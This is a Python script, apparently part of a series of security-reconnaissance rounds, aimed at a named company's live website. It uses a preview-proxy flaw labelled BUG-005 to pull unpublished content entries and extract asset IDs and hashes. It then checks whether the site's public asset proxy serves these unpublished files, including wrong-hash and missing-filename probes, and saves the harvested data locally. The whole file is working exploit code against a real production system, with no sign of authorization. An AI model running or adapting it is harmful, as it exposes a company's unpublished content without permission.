#!/usr/bin/env python3
"""Round 7D: unpublished-asset isolation test via www /ctf/ asset proxy.
For each unpublished product entry (via BUG-005 preview proxy), extract embedded
Asset objects, then test whether the www asset proxy serves them (and hash-capability behavior)."""
import json, re, time, urllib.request

PROXY = 'https://www.dutchbros.com/api/contentful/preview?entryId={eid}'
IDS = ['108FxbBbDilsni0vfAZUdy','1BjG907Et15Woth7R76gAs','1Vk8EchNWIgiTYiq9AjLR8',
       '1ezpfzYcQkwN4W8UDKqzqd','2JAPvEZpeteeWXnE9ndwOD','2RC3a5rLcnm6s6KwhAVZbZ',
       '2UX7R7mnplSZuPf8thPz9W','32dm3qE1wMWiGU3ghRkpa6','342vEWP2veoWSZOCCIbiXu',
       '3Rm57HUYr5Ob9aKkk2U5Mt','3UwsdsJxdZKV1GJ8XrqRqD','4fWhSdLHJxD9UHyoB9ybY3']

def get(url):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (research)'})
    try:
        r = urllib.request.urlopen(req, timeout=20)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()

assets = {}
for eid in IDS:
    code, body = get(PROXY.format(eid=eid))
    if code != 200:
        print(f'[-] {eid}: {code}'); continue
    d = json.loads(body)
    title = d.get('fields', {}).get('title', '?')
    blob = json.dumps(d)
    # every embedded asset: id + file.url
    for m in re.finditer(r'"type":\s*"Asset",\s*"id":\s*"([A-Za-z0-9_-]{20,23})"', blob):
        aid = m.group(1)
        um = re.search(r'"url":\s*"(//images\.ctfassets\.net/tesk7a84db2g/' + aid + r'/([a-f0-9]{32})/([^"]+))"', blob)
        if um:
            assets[aid] = (um.group(2), um.group(3), title)
    time.sleep(0.3)

print(f'\n== extracted {len(assets)} assets ==')
for aid, (h, fn, title) in list(assets.items())[:20]:
    print(f'  {aid}  {h[:12]}...  {fn[:44]}  ({title[:32]})')

# test via www /ctf/ proxy
print('\n== www asset proxy test ==')
for aid, (h, fn, title) in list(assets.items())[:8]:
    code, body = get(f'https://www.dutchbros.com/ctf/tesk7a84db2g/{aid}/{h}/{fn}')
    print(f'  {code} {len(body):>7}b  /ctf/.../{aid}/{h[:10]}/{fn[:30]}')

# hash-capability check on first asset: corrupt hash
if assets:
    aid, (h, fn, title) = next(iter(assets.items()))
    code, body = get(f'https://www.dutchbros.com/ctf/tesk7a84db2g/{aid}/{"0"*32}/{fn}')
    print(f'\n  wrong-hash test: {code} ({len(body)}b)')
    code, body = get(f'https://www.dutchbros.com/ctf/tesk7a84db2g/{aid}/{h}')
    print(f'  no-filename test: {code}')

# save results
json.dump({k: {'hash': v[0], 'file': v[1], 'entry': v[2]} for k, v in assets.items()},
          open('/home/z/my-project/recon/storesweep/r7d_assets.json', 'w'), indent=1)
print('\nsaved -> recon/storesweep/r7d_assets.json')
